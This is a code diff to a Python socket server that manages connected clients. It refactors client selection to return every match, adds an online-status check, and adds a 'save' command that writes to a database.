@@ -51,9 +51,11 @@ class Client(object):
 	def get_attributes(self, key):
 		return self._attributes.get(key, None)
 
-	def say_hello(self): # self is a reference to the object
-		print("hello") # you use self so you can access attributes of the object
-		return
+	def is_online(self): # self is a reference to the object
+		if self._attributes['socket'] == False:
+			return 'Offline'
+		else:
+			return 'Online'
 
 	def __hiddenMethod(self): # a hidden method
 		print "Hard to Find"
@@ -67,15 +69,20 @@ def client_select(key, value):
 	that addresses a specific client.
 	
 	"""
+	selected_clients = []
 	d_print("Looking for client with %s: %s" % (key, value))
 	for client in clients_list:
 		if client.get_attributes(key) == value:
 			# we only return the first match, maybe this is not ideal
-			return client
+			selected_clients.append(client)
 		else:
 			pass
-	print("[Warning] No client in the list matches the selection criteria")
-	return False
+
+	if len(selected_clients) > 0:
+		return selected_clients
+	else:
+		print("[Warning] No client in the list matches the selection criteria")
+		return False
 
 
 def set_client_attribute(*attributes):
@@ -102,14 +109,16 @@ def set_client_attribute(*attributes):
 	client = client_select(selection_attribute[0], 
 							selection_attribute[1]) # get the client object
 	
-	if (client):					
-		client.set_attributes(target_attribute[0],
-								target_attribute[1])
 
-		print('setting %s for client %s to %s' % (
-			target_attribute[0], 
-			client.get_attributes('hostname'), 
-			target_attribute[1]))
+	if (client):
+		for c in client:
+			c.set_attributes(target_attribute[0],
+									target_attribute[1])
+
+			print('setting %s for client %s to %s' % (
+				target_attribute[0], 
+				c.get_attributes('hostname'), 
+				target_attribute[1]))
 		return
 	else:
 		print("[Warning] The command failed")
@@ -220,7 +229,7 @@ def handle(socket, address):
 		if line.lower() == 'clients':
 			print('[<-] Sending list of clients to interface')
 			for client in clients_list:
-				list_of_clients = client.get_attributes('hostname') + " " + str(client.get_attributes('status'))
+				list_of_clients = client.get_attributes('hostname') + " " + client.is_online()
 				d_print(list_of_clients)
 				fileobj.write(list_of_clients + '\n')
 			fileobj.flush()
@@ -257,6 +266,9 @@ def handle(socket, address):
 			
 		elif line.lower() == 'k':
 			clients_list[0].send('kill')
+
+		elif line.lower() == 'save':
+			save_to_database()
 		
 		elif line.lower() == 'quit':
 			print('[x] Closed connection from %s:%s' % address)
